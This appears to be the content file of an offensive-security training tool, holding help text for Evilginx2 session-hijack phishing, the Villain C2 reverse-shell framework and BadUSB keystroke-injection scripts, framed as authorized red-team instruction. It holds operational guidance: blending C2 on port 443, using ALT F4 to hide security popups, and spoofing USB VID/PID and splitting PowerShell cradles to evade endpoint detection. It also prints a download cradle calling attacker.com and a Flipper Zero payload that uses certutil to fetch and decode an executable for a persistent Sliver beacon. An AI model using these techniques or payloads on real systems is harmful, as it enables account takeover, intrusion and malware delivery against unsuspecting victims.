CONDITIONAL ACCESS FALSE NEGATIVE — TOKEN APPEARS VALID BUT IS RESTRICTED: Evilginx2 reports a session as valid based on cookie presence, not on what that cookie can actually access. In tenants with Conditional Access policies requiring compliant devices, the captured ESTSAUTH cookie will authenticate the user to the Microsoft login portal but will be blocked by a CAE check the moment it attempts to access a protected resource (Exchange, SharePoint, Azure portal). The operator will see a valid session in Evilginx2 but receive a 'AADSTS53003: Access has been blocked by Conditional Access policies' error when attempting to use it. This is not a tool failure — it is a tenant-side control that Evilginx2 cannot bypass.

DNS PROPAGATION LAG — VICTIMS HIT DEAD LURE: If the phishing domain's DNS has not fully propagated when lures are delivered, some victims will receive NXDOMAIN responses and the lure URL will appear broken. Evilginx2's built-in DNS server only serves authoritative responses for clients that resolve directly to your VPS IP. Victims whose ISP DNS cache has a stale negative response will not reach the phishlet. This can cause operators to undercount campaign success — a victim may have clicked the lure but never reached the proxy.

SANDBOX DETONATION BURNS LURES: Security email gateways (Proofpoint TAP, Mimecast, Microsoft Defender for Office 365 Safe Links) detonate URLs in sandboxes before delivering the email to the victim. If the lure URL is single-use and the sandbox hits it first, the victim receives a dead link and the operator sees a session entry from a sandbox IP (typically in ASN ranges belonging to the vendor). Operators frequently miscount these as successful victim hits. Cross-reference session remote-ip values against known sandbox ASN ranges before claiming campaign success.

EVILGINX2 SESSION TIMER VS. ACTUAL TOKEN EXPIRY: The 'update-time' field in the sessions output reflects the last time Evilginx2 received traffic through the proxy for that session — it does NOT reflect the actual expiry time of the captured cookie as set by the IdP. A session showing 'update-time' from 10 minutes ago may have a cookie that expired 5 minutes ago (short-lived tokens) or may still be valid for 89 more days (persistent tokens). Always decode the JWT payload of captured tokens (base64 decode the middle segment) to read the 'exp' claim directly rather than relying on Evilginx2's session metadata.

villain.description: Modern open-source C2 (Command and Control) framework for adversary simulation. Creates encrypted reverse shell handlers for Windows and Linux, supports multiple simultaneous sessions, team collaboration, and payload generation. Designed as a free alternative to Cobalt Strike for authorized red team operations.
villain.teach_intro: A C2 framework is the attacker's operations center. After exploitation, a payload on the victim connects back to Villain and gives you a persistent, encrypted shell. Villain handles multiple operators, logs all activity, and generates obfuscated payloads. Understanding C2 infrastructure is essential — both to simulate attacks and to hunt for them as a defender.

-p.label: Port
-p.desc: Listening port for reverse connections. Default 6001.
-p.teach: Pick ports that blend with legitimate traffic: 443 (HTTPS), 80 (HTTP), 8080, 8443. Firewalls block inbound but usually allow outbound to 443 — making 443 the classic C2 port.

-f.label: Teamserver File
-f.teach: In red team ops, multiple operators share one C2. Teamserver config defines shared settings so everyone connects to the same C2 infrastructure.

generate.label: Generate Payload
generate.desc: In Villain console: generate payload for Windows or Linux.
generate.teach: Villain generates PowerShell or Bash one-liners that connect back. PowerShell payloads work in-memory without touching disk. The payload is the code you deliver to the victim.

sessions.label: List Sessions
sessions.desc: Show all active reverse shell connections.
sessions.teach: Each connected victim appears as a session. Shell into any: shell [session_id]. Sessions persist even if you close Villain — victims reconnect automatically.

shell.label: Interact with Session
shell.desc: Open interactive shell on a connected victim.
shell.teach: Interactive shell in the victim's context. From here: upload/download files, escalate privileges, pivot to other machines, harvest credentials. Always document every command for the report.

badusb.description: BadUSB attacks exploit the trust computers place in USB Human Interface Devices (HIDs). A malicious USB device impersonates a keyboard and types commands at superhuman speed the moment it's plugged in. Used with: Flipper Zero, USB Rubber Ducky, Bash Bunny, Pi Zero W, and the DigiSpark. Essential for demonstrating physical security gaps.
badusb.teach_intro: Your computer unconditionally trusts keyboards. When a BadUSB device is plugged in, it tells the OS 'I am a keyboard' and immediately starts typing commands — opening a terminal, downloading a payload, creating a backdoor — all in seconds before anyone reacts. This is why physical access controls matter as much as network security.

DELAY.label: Delay (ms)
DELAY.desc: Wait N milliseconds before next command. Gives OS time to open applications.
DELAY.teach: Without delays, commands execute before the OS is ready. DELAY 500 after WIN+R gives time for the Run dialog. DELAY 2000 after opening PowerShell gives it time to initialize.

STRING.label: Type Text
STRING.desc: Type a string of characters exactly.
STRING.teach: STRING types text character by character at keyboard speed. This is how payloads are injected — type a PowerShell command directly into a Run box or terminal.

ENTER.label: Press Enter
ENTER.teach: Submits forms, confirms dialogs, executes typed commands. Every command sequence ends with ENTER.

GUI.label: Windows Key
GUI.desc: Press the Windows key, optionally with another key: GUI r = Win+R (Run dialog)
GUI.example:
GUI r
DELAY 500
STRING cmd
ENTER
GUI.teach: GUI r opens Run dialog — fastest way to open CMD or PowerShell. GUI x opens Power User menu. GUI l locks the workstation (useful for physical access scenarios).

ALT.label: Alt Key Combo
ALT.desc: ALT F4 closes windows, ALT TAB switches, ALT SPACE opens title menu.
ALT.teach: Key combinations for UI control. ALT F4 to close security popups before the user sees them. Used to hide evidence of the attack.

CTRL.label: Ctrl Key Combo
CTRL.desc: CTRL ALT T opens terminal on Linux. CTRL C cancels. CTRL V pastes.
CTRL.teach: On Linux: CTRL ALT T opens terminal instantly — faster than any menu navigation. Combined with STRING and ENTER = immediate root shell if sudoers is misconfigured.

opsec_notes: BEGINNER NOISE: The moment a BadUSB device is plugged in, the OS logs a new HID device connection. On Windows, Event ID 6416 (Plug and Play) fires in the System log under Microsoft-Windows-Kernel-PnP/Operational — this is the single loudest artifact the attack produces and is trivially correlated with the timestamp of any subsequent suspicious process.

Every command the payload types is executed under the logged-in user's shell. On Windows, this means PowerShell or cmd.exe spawns with the parent process being explorer.exe (or winlogon.exe if run at the lock screen via a specialized payload) — a parent-child relationship that CrowdStrike Falcon's process tree analysis flags as anomalous when explorer.exe spawns powershell.exe with encoded or download-cradle arguments.

CUTTING-EDGE 2025-2026: SentinelOne and Defender for Endpoint both score command-line entropy on PowerShell invocations. A payload that types a base64-encoded download cradle (e.g., `powershell -enc <long_base64_blob>`) will immediately trigger AMSI scanning of the decoded string AND generate a high-entropy command-line alert. Modern BadUSB payloads split the cradle across multiple STRING lines with intermediate variable assignments to reduce per-line entropy — but this extends execution time and increases the window for a user to physically intervene.

CUTTING-EDGE 2025-2026: Windows 11 22H2+ with Defender for Endpoint Plan 2 enables USB device control policies that can block HID enrollment from non-whitelisted Vendor ID / Product ID pairs. The Rubber Ducky (VID 0x03EB, PID 0x2401) and Flipper Zero (VID 0x0483, PID 0x5740) have known VID/PID signatures. Defenders using Intune device compliance policies or CrowdStrike's USB device control module can block these specific devices before the first keystroke fires. Operators must spoof VID/PID to a whitelisted device (e.g., a common Logitech keyboard: VID 0x046D) using custom firmware or a programmable microcontroller.

CONCRETE ARTIFACT — Sysmon EID 1 (Process Create): When the payload opens a terminal and runs commands, Sysmon logs the full command line, parent image path, and user context. A payload that runs `powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')` will appear verbatim in Sysmon EID 1 with ParentImage = C:\\Windows\\explorer.exe and User = the logged-in account. This log is shipped to the SIEM within seconds on a modern SOC stack.

Physical timing matters for OpSec: most BadUSB payloads begin typing within 1-3 seconds of plug-in. Adding a DELAY of 2000-5000ms at the start of the payload allows the OS to fully enumerate the device and stabilize the HID driver before keystrokes fire — reducing dropped characters that cause payload failure. However, longer delays also give a physically present user more time to notice and unplug the device. Tune DELAY to the minimum reliable value for the target OS, not the maximum.

sample_outputs.scenario: Advanced scenario: operator uses a Flipper Zero (Bad USB module) against an unlocked Windows 11 22H2 workstation in a corporate environment. Goal is to establish a Sliver C2 beacon using a living-off-the-land cradle that avoids high-entropy PowerShell flags, splits the download across certutil to reduce AMSI surface, and achieves persistence via a scheduled task — all within a 15-second payload window.
sample_outputs.output:
DuckEncoder v2.6.3
[*] Reading payload: sliver_lolbin_persist.txt
[*] Encoding for: us
[*] Lines processed: 22
[*] Tokens encoded: 31
[*] Output written: inject.bin (1024 bytes)
[*] Done.

--- Payload steps (annotated) ---
DELAY 3000
GUI r
DELAY 500
STRING cmd /c certutil -urlcache -split -f http://10.10.14.9/s.b64 %TEMP%\s.b64
ENTER
DELAY 2000
STRING certutil -decode %TEMP%\s.b64 %TEMP%\s.exe
ENTER
